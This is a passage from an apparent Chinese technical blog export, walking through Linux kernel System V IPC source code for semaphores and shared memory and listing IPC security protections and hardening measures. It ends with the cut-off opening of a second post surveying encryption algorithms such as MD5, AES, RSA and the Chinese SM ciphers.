-EFAULT; return err; case IPC_SET: if (copy_msqid_from_user(\u0026amp;msqid64, buf, version)) return -EFAULT; return msgctl_down(ns, msqid, cmd, \u0026amp;msqid64.msg_perm, msqid64.msg_qbytes); case IPC_RMID: return msgctl_down(ns, msqid, cmd, NULL, 0); default: return -EINVAL; } } 信号量 **信号量（semaphore）**与已经介绍过的 IPC 结构不同，它是一个计数器。信号量用于实现进程间的互斥与同步，而不是用于存储进程间通信数据。\n特点 信号量用于进程间同步，若要在进程间传递数据需要结合共享内存。 信号量基于操作系统的 PV 操作，程序对信号量的操作都是原子操作。 每次对信号量的 PV 操作不仅限于对信号量值加 1 或减 1，而且可以加减任意正整数。 支持信号量组。 结构体 最简单的信号量是只能取 0 和 1 的变量，这也是信号量最常见的一种形式，叫做二值信号量（Binary Semaphore）。而可以取多个正整数的信号量被称为通用信号量。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 /* One semaphore structure for each semaphore in the system. */ struct sem { int\tsemval;\t/* current value */ /* * PID of the process that last modified the semaphore. For * Linux, specifically these are: * - semop * - semctl, via SETVAL and SETALL. * - at task exit when performing undo adjustments (see exit_sem). */ struct pid *sempid; spinlock_t\tlock;\t/* spinlock for fine-grained semtimedop */ struct list_head pending_alter; /* pending single-sop operations */ /* that alter the semaphore */ struct list_head pending_const; /* pending single-sop operations */ /* that do not alter the semaphore*/ time64_t\tsem_otime;\t/* candidate for sem_otime */ } ____cacheline_aligned_in_smp; /* One sem_array data structure for each set of semaphores in the system. */ struct sem_array { struct kern_ipc_perm\tsem_perm;\t/* permissions .. see ipc.h */ time64_t\tsem_ctime;\t/* create/last semctl() time */ struct list_head\tpending_alter;\t/* pending operations */ /* that alter the array */ struct list_head\tpending_const;\t/* pending complex operations */ /* that do not alter semvals */ struct list_head\tlist_id;\t/* undo requests on this array */ int\tsem_nsems;\t/* no. of semaphores in array */ int\tcomplex_count;\t/* pending complex operations */ unsigned int\tuse_global_lock;/* \u0026gt;0: global lock required */ struct sem\tsems[]; } __randomize_layout; 核心函数 semget函数\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 long ksys_semget(key_t key, int nsems, int semflg) { struct ipc_namespace *ns; static const struct ipc_ops sem_ops = { .getnew = newary, .associate = security_sem_associate, .more_checks = sem_more_checks, }; struct ipc_params sem_params; ns = current-\u0026gt;nsproxy-\u0026gt;ipc_ns; if (nsems \u0026lt; 0 || nsems \u0026gt; ns-\u0026gt;sc_semmsl) return -EINVAL; sem_params.key = key; sem_params.flg = semflg; sem_params.u.nsems = nsems; return ipcget(ns, \u0026amp;sem_ids(ns), \u0026amp;sem_ops, \u0026amp;sem_params); } perform_atomic_semop函数，尝试在给定的数组上进行信号量操作（PV操作），遍历两次队列确保整个操作顺利完成。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 /** * perform_atomic_semop[_slow] - Attempt to perform semaphore * operations on a given array. * @sma: semaphore array * @q: struct sem_queue that describes the operation * * Caller blocking are as follows, based the value * indicated by the semaphore operation (sem_op): * * (1) \u0026gt;0 never blocks. * (2) 0 (wait-for-zero operation): semval is non-zero. * (3) \u0026lt;0 attempting to decrement semval to a value smaller than zero. * * Returns 0 if the operation was possible. * Returns 1 if the operation is impossible, the caller must sleep. * Returns \u0026lt;0 for error codes. */ static int perform_atomic_semop(struct sem_array *sma, struct sem_queue *q) { int result, sem_op, nsops; struct sembuf *sop; struct sem *curr; struct sembuf *sops; struct sem_undo *un; sops = q-\u0026gt;sops; nsops = q-\u0026gt;nsops; un = q-\u0026gt;undo; if (unlikely(q-\u0026gt;dupsop)) return perform_atomic_semop_slow(sma, q); /* * We scan the semaphore set twice, first to ensure that the entire * operation can succeed, therefore avoiding any pointless writes * to shared memory and having to undo such changes in order to block * until the operations can go through. */ for (sop = sops; sop \u0026lt; sops + nsops; sop++) { int idx = array_index_nospec(sop-\u0026gt;sem_num, sma-\u0026gt;sem_nsems); curr = \u0026amp;sma-\u0026gt;sems[idx]; sem_op = sop-\u0026gt;sem_op; result = curr-\u0026gt;semval; if (!sem_op \u0026amp;\u0026amp; result) goto would_block; /* wait-for-zero */ result += sem_op; if (result \u0026lt; 0) goto would_block; if (result \u0026gt; SEMVMX) return -ERANGE; if (sop-\u0026gt;sem_flg \u0026amp; SEM_UNDO) { int undo = un-\u0026gt;semadj[sop-\u0026gt;sem_num] - sem_op; /* Exceeding the undo range is an error. */ if (undo \u0026lt; (-SEMAEM - 1) || undo \u0026gt; SEMAEM) return -ERANGE; } } for (sop = sops; sop \u0026lt; sops + nsops; sop++) { curr = \u0026amp;sma-\u0026gt;sems[sop-\u0026gt;sem_num]; sem_op = sop-\u0026gt;sem_op; if (sop-\u0026gt;sem_flg \u0026amp; SEM_UNDO) { int undo = un-\u0026gt;semadj[sop-\u0026gt;sem_num] - sem_op; un-\u0026gt;semadj[sop-\u0026gt;sem_num] = undo; } curr-\u0026gt;semval += sem_op; ipc_update_pid(\u0026amp;curr-\u0026gt;sempid, q-\u0026gt;pid); } return 0; would_block: q-\u0026gt;blocking = sop; return sop-\u0026gt;sem_flg \u0026amp; IPC_NOWAIT ? -EAGAIN : 1; } ksys_semctl函数，该函数用来控制信号量，它与共享内存的shmctl函数和消息队列的msgctl相似\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 static long ksys_semctl(int semid, int semnum, int cmd, unsigned long arg, int version) { struct ipc_namespace *ns; void __user *p = (void __user *)arg; struct semid64_ds semid64; int err; if (semid \u0026lt; 0) return -EINVAL; ns = current-\u0026gt;nsproxy-\u0026gt;ipc_ns; switch (cmd) { case IPC_INFO: case SEM_INFO: return semctl_info(ns, semid, cmd, p); case IPC_STAT: case SEM_STAT: case SEM_STAT_ANY: err = semctl_stat(ns, semid, cmd, \u0026amp;semid64); if (err \u0026lt; 0) return err; if (copy_semid_to_user(p, \u0026amp;semid64, version)) err = -EFAULT; return err; case GETALL: case GETVAL: case GETPID: case GETNCNT: case GETZCNT: case SETALL: return semctl_main(ns, semid, semnum, cmd, p); case SETVAL: { int val; #if defined(CONFIG_64BIT) \u0026amp;\u0026amp; defined(__BIG_ENDIAN) /* big-endian 64bit */ val = arg \u0026gt;\u0026gt; 32; #else /* 32bit or little-endian 64bit */ val = arg; #endif return semctl_setval(ns, semid, semnum, val); } case IPC_SET: if (copy_semid_from_user(\u0026amp;semid64, p, version)) return -EFAULT; fallthrough; case IPC_RMID: return semctl_down(ns, semid, cmd, \u0026amp;semid64); default: return -EINVAL; } } 共享内存 共享内存（Shared Memory），指两个或多个进程共享一个给定的存储区。\n特点 共享内存是最快的一种 IPC，因为进程是直接对内存进行存取。 共享内存操作默认不阻塞，如果多个进程同时读写共享内存，可能出现数据混乱，共享内存需要借助其他机制来保证进程间的数据同步，比如：信号量，共享内存内部没有提供这种机制。 核心函数 创建共享内存段 (shmget)： shmget 系统调用创建新的共享内存段，分配对应的物理内存，并初始化相关的结构体信息。 附加共享内存段 (shmat)： shmat 系统调用将共享内存段映射到调用进程的地址空间中，更新附加计数和时间戳。 分离共享内存段 (shmdt)： shmdt 系统调用将共享内存段从调用进程的地址空间中解除映射，更新附加计数和时间戳。 控制共享内存段 (shmctl)： shmctl 系统调用用于控制共享内存段，例如设置权限、删除共享内存段等。 主要结构体 结构体 shmid_kernel\n共享内存段在内核中使用 shmid_kernel 结构体表示，该结构体定义如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 struct shmid_kernel { struct kern_ipc_perm shm_perm; /* 权限结构体 */ struct file *shm_file; /* 对应的文件 */ size_t shm_segsz; /* 段大小 */ struct user_struct *shm_creator; /* 创建者 */ struct user_struct *shm_last_attach; /* 最后一次附加的用户 */ struct work_struct shm_rmid_work; /* 删除工作 */ int shm_nattch; /* 当前附加的进程数 */ time64_t shm_atim; /* 最后附加时间 */ time64_t shm_dtim; /* 最后分离时间 */ time64_t shm_ctim; /* 最后改变时间 */ pid_t shm_cprid; /* 创建者 PID */ pid_t shm_lprid; /* 最后附加或分离的 PID */ }; 详细分析 实际源码中的函数名需要加上ksys_前缀，原因大概是为了区分内核内部调用和用户空间接口，ksys_shmget函数封装的一层后变成了shmget函数。\n使用 ksys_ 前缀可以清楚地将内核内部函数与用户空间系统调用接口区分开来。用户空间程序调用的是无前缀的系统调用（例如 sys_open），而内核内部模块或函数调用的是 ksys_open。\n1 2 3 4 SYSCALL_DEFINE3(shmget, key_t, key, size_t, size, int, shmflg) { return ksys_shmget(key, size, shmflg); } 1、共享内存的创建\n创建共享内存段的主要函数是 shmget。\n实际调用的函数是ipcget()。共享内存、信号量、消息队列三种对象创建的时候都会调用这个函数。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 long ksys_shmget(key_t key, size_t size, int shmflg) { struct ipc_namespace *ns; static const struct ipc_ops shm_ops = { .getnew = newseg, .associate = security_shm_associate, .more_checks = shm_more_checks, }; struct ipc_params shm_params; ns = current-\u0026gt;nsproxy-\u0026gt;ipc_ns; shm_params.key = key; shm_params.flg = shmflg; shm_params.u.size = size; return ipcget(ns, \u0026amp;shm_ids(ns), \u0026amp;shm_ops, \u0026amp;shm_params); } 参数:\nkey: 类型 key_t 是个整形数，通过这个key可以创建或者打开一块共享内存，该参数的值一定要大于0\nsize: 创建共享内存的时候，指定共享内存的大小，如果是打开一块存在的共享内存，size 是没有意义的\nshmflg：创建共享内存的时候指定的属性\nIPC_CREAT: 创建新的共享内存，如果创建共享内存，需要指定对共享内存的操作权限，比如：IPC_CREAT | 0664 IPC_EXCL: 检测共享内存是否已经存在了，必须和 IPC_CREAT 一起使用 返回值：共享内存创建或者打开成功返回标识共享内存的唯一的 ID，失败返回 - 1.\n我们回头来看看shmget()究竟干了啥，首先看一下ipcget()\n1 2 3 4 5 6 7 8 int ipcget(struct ipc_namespace *ns, struct ipc_ids *ids, const struct ipc_ops *ops, struct ipc_params *params) { if (params-\u0026gt;key == IPC_PRIVATE) return ipcget_new(ns, ids, ops, params); else return ipcget_public(ns, ids, ops, params); } 如果传进来的参数是IPC_PRIVATE（这个宏的值是0）的话，无论是什么mode，都会创建一块新的共享内存。如果非0，则会去已有的共享内存中找有没有这个key的，有就返回，没有就新建。\n2、共享内存的关联\n关联共享内存段的主要函数是 shmat，它的逻辑全在do_shmat()中，所以我们直接看这个函数。\n首先检查shmaddr的合法性并进行对齐，即调整为shmlba的整数倍。如果传入addr是0，前面检查部分只会加上一个MAP_SHARED标志，因为后面的mmap会自动为其分配地址。然后从那一段两行的注释开始，函数通过shmid尝试获取共享内存对象，并进行权限检查。然后修改shp中的一些数据，比如连接进程数加一。然后是通过alloc_file_clone()创建真正的要做mmap的file。在mmap之前还要对地址空间进行检查，检查是否和别的地址重叠，是否够用。实际的映射工作就在do_mmap()函数中做了。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168 169 170 171 172 173 long do_shmat(int shmid, char __user *shmaddr, int shmflg, ulong *raddr, unsigned long shmlba) { struct shmid_kernel *shp; unsigned long addr = (unsigned long)shmaddr; unsigned long size; struct file *file, *base; int err; unsigned long flags = MAP_SHARED; unsigned long prot; int acc_mode; struct ipc_namespace *ns; struct shm_file_data *sfd; int f_flags; unsigned long populate = 0; err = -EINVAL; if (shmid \u0026lt; 0) goto out; if (addr) { if (addr \u0026amp; (shmlba - 1)) { if (shmflg \u0026amp; SHM_RND) { addr \u0026amp;= ~(shmlba - 1); /* round down */ /* * Ensure that the round-down is non-nil * when remapping. This can happen for * cases when addr \u0026lt; shmlba. */ if (!addr \u0026amp;\u0026amp; (shmflg \u0026amp; SHM_REMAP)) goto out; } else #ifndef __ARCH_FORCE_SHMLBA if (addr \u0026amp; ~PAGE_MASK) #endif goto out; } flags |= MAP_FIXED; } else if ((shmflg \u0026amp; SHM_REMAP)) goto out; if (shmflg \u0026amp; SHM_RDONLY) { prot = PROT_READ; acc_mode = S_IRUGO; f_flags = O_RDONLY; } else { prot = PROT_READ | PROT_WRITE; acc_mode = S_IRUGO | S_IWUGO; f_flags = O_RDWR; } if (shmflg \u0026amp; SHM_EXEC) { prot |= PROT_EXEC; acc_mode |= S_IXUGO; } /* * We cannot rely on the fs check since SYSV IPC does have an * additional creator id... */ ns = current-\u0026gt;nsproxy-\u0026gt;ipc_ns; rcu_read_lock(); shp = shm_obtain_object_check(ns, shmid); if (IS_ERR(shp)) { err = PTR_ERR(shp); goto out_unlock; } err = -EACCES; if (ipcperms(ns, \u0026amp;shp-\u0026gt;shm_perm, acc_mode)) goto out_unlock; err = security_shm_shmat(\u0026amp;shp-\u0026gt;shm_perm, shmaddr, shmflg); if (err) goto out_unlock; ipc_lock_object(\u0026amp;shp-\u0026gt;shm_perm); /* check if shm_destroy() is tearing down shp */ if (!ipc_valid_object(\u0026amp;shp-\u0026gt;shm_perm)) { ipc_unlock_object(\u0026amp;shp-\u0026gt;shm_perm); err = -EIDRM; goto out_unlock; } /* * We need to take a reference to the real shm file to prevent the * pointer from becoming stale in cases where the lifetime of the outer * file extends beyond that of the shm segment. It\u0026#39;s not usually * possible, but it can happen during remap_file_pages() emulation as * that unmaps the memory, then does -\u0026gt;mmap() via file reference only. * We\u0026#39;ll deny the -\u0026gt;mmap() if the shm segment was since removed, but to * detect shm ID reuse we need to compare the file pointers. */ base = get_file(shp-\u0026gt;shm_file); shp-\u0026gt;shm_nattch++; size = i_size_read(file_inode(base)); ipc_unlock_object(\u0026amp;shp-\u0026gt;shm_perm); rcu_read_unlock(); err = -ENOMEM; sfd = kzalloc(sizeof(*sfd), GFP_KERNEL); if (!sfd) { fput(base); goto out_nattch; } file = alloc_file_clone(base, f_flags, is_file_hugepages(base) ? \u0026amp;shm_file_operations_huge : \u0026amp;shm_file_operations); err = PTR_ERR(file); if (IS_ERR(file)) { kfree(sfd); fput(base); goto out_nattch; } sfd-\u0026gt;id = shp-\u0026gt;shm_perm.id; sfd-\u0026gt;ns = get_ipc_ns(ns); sfd-\u0026gt;file = base; sfd-\u0026gt;vm_ops = NULL; file-\u0026gt;private_data = sfd; err = security_mmap_file(file, prot, flags); if (err) goto out_fput; if (mmap_write_lock_killable(current-\u0026gt;mm)) { err = -EINTR; goto out_fput; } if (addr \u0026amp;\u0026amp; !(shmflg \u0026amp; SHM_REMAP)) { err = -EINVAL; if (addr + size \u0026lt; addr) goto invalid; if (find_vma_intersection(current-\u0026gt;mm, addr, addr + size)) goto invalid; } addr = do_mmap(file, addr, size, prot, flags, 0, 0, \u0026amp;populate, NULL); *raddr = addr; err = 0; if (IS_ERR_VALUE(addr)) err = (long)addr; invalid: mmap_write_unlock(current-\u0026gt;mm); if (populate) mm_populate(addr, populate); out_fput: fput(file); out_nattch: down_write(\u0026amp;shm_ids(ns).rwsem); shp = shm_lock(ns, shmid); shp-\u0026gt;shm_nattch--; if (shm_may_destroy(shp)) shm_destroy(ns, shp); else shm_unlock(shp); up_write(\u0026amp;shm_ids(ns).rwsem); return err; out_unlock: rcu_read_unlock(); out: return err; } 3、共享内存的解除关联\n当进程不需要再操作共享内存，可以让进程和共享内存解除关联，另外如果没有执行该操作，进程退出之后，结束的进程和共享内存的关联也就自动解除了。\n这个函数先找到传入的shmaddr对应的虚拟内存数据结构vma，检查它的地址是不是正确的，然后调用do_vma_munmap()函数断开对共享内存的连接。注意此操作并不会销毁共享内存，即使没有进程连接到它也不会，只有手动调用shmctl(id, IPC_RMID, NULL)才能销毁。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 COMPAT_SYSCALL_DEFINE3(shmat, int, shmid, compat_uptr_t, shmaddr, int, shmflg) { unsigned long ret; long err; err = do_shmat(shmid, compat_ptr(shmaddr), shmflg, \u0026amp;ret, COMPAT_SHMLBA); if (err) return err; force_successful_syscall_return(); return (long)ret; } #endif /* * detach and kill segment if marked destroyed. * The work is done in shm_close. */ long ksys_shmdt(char __user *shmaddr) { struct mm_struct *mm = current-\u0026gt;mm; struct vm_area_struct *vma; unsigned long addr = (unsigned long)shmaddr; int retval = -EINVAL; #ifdef CONFIG_MMU loff_t size = 0; struct file *file; VMA_ITERATOR(vmi, mm, addr); #endif if (addr \u0026amp; ~PAGE_MASK) return retval; if (mmap_write_lock_killable(mm)) return -EINTR; /* * This function tries to be smart and unmap shm segments that * were modified by partial mlock or munmap calls: * - It first determines the size of the shm segment that should be * unmapped: It searches for a vma that is backed by shm and that * started at address shmaddr. It records it\u0026#39;s size and then unmaps * it. * - Then it unmaps all shm vmas that started at shmaddr and that * are within the initially determined size and that are from the * same shm segment from which we determined the size. * Errors from do_munmap are ignored: the function only fails if * it\u0026#39;s called with invalid parameters or if it\u0026#39;s called to unmap * a part of a vma. Both calls in this function are for full vmas, * the parameters are directly copied from the vma itself and always * valid - therefore do_munmap cannot fail. (famous last words?) */ /* * If it had been mremap()\u0026#39;d, the starting address would not * match the usual checks anyway. So assume all vma\u0026#39;s are * above the starting address given. */ #ifdef CONFIG_MMU for_each_vma(vmi, vma) { /* * Check if the starting address would match, i.e. it\u0026#39;s * a fragment created by mprotect() and/or munmap(), or it * otherwise it starts at this address with no hassles. */ if ((vma-\u0026gt;vm_ops == \u0026amp;shm_vm_ops) \u0026amp;\u0026amp; (vma-\u0026gt;vm_start - addr)/PAGE_SIZE == vma-\u0026gt;vm_pgoff) { /* * Record the file of the shm segment being * unmapped. With mremap(), someone could place * page from another segment but with equal offsets * in the range we are unmapping. */ file = vma-\u0026gt;vm_file; size = i_size_read(file_inode(vma-\u0026gt;vm_file)); do_vma_munmap(\u0026amp;vmi, vma, vma-\u0026gt;vm_start, vma-\u0026gt;vm_end, NULL, false); /* * We discovered the size of the shm segment, so * break out of here and fall through to the next * loop that uses the size information to stop * searching for matching vma\u0026#39;s. */ retval = 0; vma = vma_next(\u0026amp;vmi); break; } } /* * We need look no further than the maximum address a fragment * could possibly have landed at. Also cast things to loff_t to * prevent overflows and make comparisons vs. equal-width types. */ size = PAGE_ALIGN(size); while (vma \u0026amp;\u0026amp; (loff_t)(vma-\u0026gt;vm_end - addr) \u0026lt;= size) { /* finding a matching vma now does not alter retval */ if ((vma-\u0026gt;vm_ops == \u0026amp;shm_vm_ops) \u0026amp;\u0026amp; ((vma-\u0026gt;vm_start - addr)/PAGE_SIZE == vma-\u0026gt;vm_pgoff) \u0026amp;\u0026amp; (vma-\u0026gt;vm_file == file)) { do_vma_munmap(\u0026amp;vmi, vma, vma-\u0026gt;vm_start, vma-\u0026gt;vm_end, NULL, false); } vma = vma_next(\u0026amp;vmi); } #else\t/* CONFIG_MMU */ vma = vma_lookup(mm, addr); /* under NOMMU conditions, the exact address to be destroyed must be * given */ if (vma \u0026amp;\u0026amp; vma-\u0026gt;vm_start == addr \u0026amp;\u0026amp; vma-\u0026gt;vm_ops == \u0026amp;shm_vm_ops) { do_munmap(mm, vma-\u0026gt;vm_start, vma-\u0026gt;vm_end - vma-\u0026gt;vm_start, NULL); retval = 0; } #endif mmap_write_unlock(mm); return retval; } 参数：shmat () 函数的返回值，共享内存的起始地址\n返回值：关联解除成功返回 0，失败返回 - 1\n4、删除共享内存\nshmctl () 函数是一个多功能函数，可以设置、获取共享内存的状态也可以将共享内存标记为删除状态。当共享内存被标记为删除状态之后，并不会马上被删除，直到所有的进程全部和共享内存解除关联，共享内存才会被删除。因为通过 shmctl () 函数只是能够标记删除共享内存，所以在程序中多次调用该操作是没有关系的。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 // 共享内存控制函数 int shmctl(int shmid, int cmd, struct shmid_ds *buf); // 参数 struct shmid_ds 结构体原型 struct shmid_ds { struct ipc_perm shm_perm; /* Ownership and permissions */ size_t shm_segsz; /* Size of segment (bytes) */ time_t shm_atime; /* Last attach time */ time_t shm_dtime; /* Last detach time */ time_t shm_ctime; /* Last change time */ pid_t shm_cpid; /* PID of creator */ pid_t shm_lpid; /* PID of last shmat(2)/shmdt(2) */ // 引用计数, 多少个进程和共享内存进行了关联 shmatt_t shm_nattch; /* 记录了有多少个进程和当前共享内存进行了管联 */ ... }; 参数:\nshmid: 要操作的共享内存的 ID, 是 shmget () 函数的返回值\ncmd: 要做的操作，比如\nIPC_STAT: 得到当前共享内存的状态\nIPC_SET: 设置共享内存的状态\nIPC_RMID: 标记共享内存要被删除了\nbuf:\ncmd==IPC_STAT, 作为传出参数，会得到共享内存的相关属性信息\ncmd==IPC_SET, 作为传入参，将用户的自定义属性设置到共享内存中\ncmd==IPC_RMID, buf 就没意义了，这时候 buf 指定为 NULL 即可\n返回值：函数调用成功返回值大于等于 0，调用失败返回 - 1\n现有安全保护机制 1、权限控制\nipc_perm 结构包含了用户 ID、组 ID 以及权限位，可以用来控制谁可以访问、修改或删除共享内存段。\n2、安全模块（LSM）框架\nLinux 内核中的安全模块（LSM）框架提供了钩子（hook），可以在各种系统调用和内核事件中插入自定义的安全检查。（在内核源码树/security/security.c中）例如，shmat 系统调用中的安全检查：\n1 2 3 4 int security_shmat(struct shmid_kernel *shp, char __user *shmaddr, int shmflg) { return call_int_hook(shmat, 0, shp, shmaddr, shmflg); } 3、命名空间隔离\n使用命名空间（Namespace）来隔离 IPC 资源。每个 IPC 命名空间都有自己的共享内存段、消息队列和信号量集合。这可以防止不同容器或进程组之间的 IPC 资源冲突或未授权访问\n4、地址空间随机化（ASLR）\n5、内存保护机制\n使用内存保护机制，如不可执行（non-executable，NX）位和只读（read-only）保护，来防止代码注入和数据篡改。\n其它IPC相关源码 1. 管道（Pipe）和命名管道（Named Pipe） 管道和命名管道的实现主要在fs/pipe.c文件中。\n功能：\n管道提供单向的数据流，适用于父子进程之间的通信。 命名管道（FIFO）类似于管道，但它存在于文件系统中，可以用于任意进程间的通信。 实现分析：\n使用循环缓冲区实现数据的读写。 提供了创建、读、写、关闭等系统调用接口。 相关文件：\nfs/pipe.c include/linux/pipe_fs_i.h 2. 套接字（Socket） 套接字是网络通信和进程间通信的重要机制，其实现涉及多个文件，分布在net目录下。\n功能：\n套接字用于通过网络进行进程间通信，支持多种协议（如TCP、UDP）。 也可以用于本地进程间通信（UNIX域套接字）。 实现分析：\n套接字的核心实现包括协议族（如AF_INET、AF_UNIX）的具体实现。 提供创建、绑定、监听、接受、发送、关闭等系统调用接口。 相关文件：\nnet/socket.c net/unix/af_unix.c include/net/sock.h 3. 信号（Signal） 信号是用于异步通知进程的一种机制。\n功能：\n向进程发送异步通知，用于中断、终止、定时等操作。 实现分析：\n内核维护信号队列，当进程处于适当状态时，处理挂起的信号。 提供信号的发送、处理、阻塞、忽略等功能。 相关文件：\nkernel/signal.c include/linux/signal.h IPC安全增强方法 要对进程间通信（IPC）机制进行安全增强，需要考虑多方面的安全威胁，并采取相应的安全措施。这些措施可以从以下几个方面来实现：\n访问控制和权限管理 使用权限控制：对共享内存、消息队列、信号量等 IPC 资源进行严格的权限控制，确保只有授权的进程可以访问。 用户和组权限：通过设置 IPC 对象的所有者、所属组和访问权限（读、写、执行），控制哪些用户和组可以访问这些 IPC 资源。 数据加密 加密传输的数据：对于在 IPC 通道中传输的数据，使用加密技术（如 AES、RSA 等）进行加密，防止数据在传输过程中被窃取或篡改。 加密共享内存：在写入共享内存的数据之前对其进行加密，并在读取时解密。 数据完整性 数据校验：使用哈希函数（如 SHA-256）或消息认证码（MAC）来校验数据的完整性，确保数据在传输过程中未被篡改。 数字签名：对重要数据进行数字签名，验证数据的来源和完整性。 防止资源滥用 限制资源使用：设置合理的资源限制（如共享内存大小、消息队列长度、信号量数量），防止进程滥用资源导致系统崩溃或性能下降。 超时机制：对 IPC 操作设置超时，避免进程因等待资源而无限阻塞。 审计和日志记录 记录操作日志：对所有 IPC 操作进行日志记录，记录操作的时间、类型、发起进程和目标进程等信息，以便在发生安全事件时进行追踪和分析。 定期审计：定期检查和分析日志，发现异常或可疑的行为，及时采取措施。 隔离和沙箱 进程隔离：使用容器（如 Docker）或虚拟化技术，将进程隔离在不同的沙箱中，限制其访问系统资源的能力。 安全上下文：在安全上下文中运行进程，限制其权限和资源访问能力，防止其对系统造成破坏。 参考资料： http://39.105.211.21:8080/132K3/kernel/src/branch/OLK-6.6-dev-k1/ipc\nlinux/ipc at v6.6 · torvalds/linux (github.com)\n【Linux编程】进程间通信（IPC） (songlee24.github.io)\n理解 Linux Kernel (11) - 进程间通信 (ffutop.com)\n阅读 Linux 内核源码——共享内存 - SegmentFault\nLinux - 进程间通信（IPC）共享内存(cnblogs.com)\n信号量(cnblogs.com)\nLinux - 进程间通信（IPC）消息队列\n","date":"2024-08-08T00:00:00Z","image":"https://chenyuan1125.github.io/p/%E8%BF%9B%E7%A8%8B%E9%97%B4%E9%80%9A%E4%BF%A1ipc%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%E5%8F%8A%E6%80%BB%E7%BB%93/1_hu5294211469750814667.jpg","permalink":"https://chenyuan1125.github.io/p/%E8%BF%9B%E7%A8%8B%E9%97%B4%E9%80%9A%E4%BF%A1ipc%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%E5%8F%8A%E6%80%BB%E7%BB%93/","title":"进程间通信（IPC）源码分析及总结"},{"content":"加密算法调研报告 美密算法 对称加密 对称加密又叫做私钥加密，即信息的发送方和接收方使用同一个密钥去加密和解密数据。对称加密的特点是算法公开、加密和解密速度快，适合于对大数据量进行加密。\n加密过程如下：明文+加密算法+私钥=\u0026gt;密文\n解密过程如下：密文+解密算法+私钥=\u0026gt;明文\n非对称加密 非对称加密也叫做公钥加密。非对称加密与对称加密相比，其安全性更好。对称加密的通信双方使用相同的密钥，如果一方的密钥遭泄露，那么整个通信就会被破解。而非对称加密使用一对密钥，即公钥和私钥，且二者成对出现。私钥被自己保存，不能对外泄露。公钥指的是公共的密钥，任何人都可以获得该密钥。用公钥或私钥中的任何一个进行加密，用另一个进行解密。\n被公钥加密过的密文只能被私钥解密，过程如下：\n明文+加密算法+公钥=\u0026gt;密文，密文+解密算法+私钥=\u0026gt;明文\n常见加密算法 MD5算法 MD5用的是哈希函数，它的典型应用是对一段信息产生信息摘要，以防止被篡改。严格来说，MD5不是一种加密算法而是摘要算法。无论是多长的输入，MD5都会输出长度为128bits的一个串(通常用16进制表示为32个字符)。\nSHA1算法 SHA1是和MD5一样流行的消息摘要算法，然而SHA1比MD5的安全性更强。对于长度小于2^64位的消息，SHA1会产生一个160位的消息摘要。基于MD5、SHA1的信息摘要特性以及不可逆(一般而言)，可以被应用在检查文件完整性以及数字签名等场景。\nHMAC算法 MAC是密钥相关的哈希运算消息认证码（Hash-basedMessageAuthenticationCode），HMAC运算利用哈希算法(MD5、SHA1等)，以一个密钥和一个消息为输入，生成一个消息摘要作为输出。HMAC发送方和接收方都有的key进行计算，而没有这把key的第三方，则是无法计算出正确的散列值的，这样就可以防止数据被篡改。\nAES算法 ES、DES、3DES都是对称的块加密算法，加解密的过程是可逆的。常用的有AES128、AES192、AES256。\nDES加密算法是一种分组密码，以64位为分组对数据加密，它的密钥长度是56位，加密解密用同一算法。DES加密算法是对密钥进行保密，而公开算法，包括加密和解密算法。这样，只有掌握了和发送方相同密钥的人才能解读由DES加密算法加密的密文数据。因此，破译DES加密算法实际上就是搜索密钥的编码。对于56位长度的密钥来说，如果用穷举法来进行搜索的话，其运算次数为2^56次。3DES是基于DES的对称算法，对一块数据用三个不同的密钥进行三次加密，强度更高。\nRSA算法 RSA加密算法是目前最有影响力的公钥加密算法，并且被普遍认为是目前最优秀的公钥方案之一。RSA是第一个能同时用于加密和数字签名的算法，它能够抵抗到目前为止已知的所有密码攻击，已被ISO推荐为公钥数据加密标准。\nRSA加密算法基于一个十分简单的数论事实：将两个大素数相乘十分容易，但想要对其乘积进行因式分解却极其困难，因此可以将乘积公开作为加密密钥。\nECC算法 ECC也是一种非对称加密算法，主要优势是在某些情况下，它比其他的方法使用更小的密钥，比如RSA加密算法，提供相当的或更高等级的安全级别。不过一个缺点是加密和解密操作的实现比其他机制时间长(相比RSA算法，该算法对CPU消耗严重)。\n国密算法 概述 国密即国家密码局认定的国产密码算法。主要有SM1，SM2，SM3，SM4。密钥长度和分组长度均为128位。\n国密算法是指国家密码管理局认定的一系列国产密码算法，包括SM1-SM9以及ZUC等。其中\nSM1、SM4、SM5、SM6、SM7、SM8、ZUC等属于对称密码， 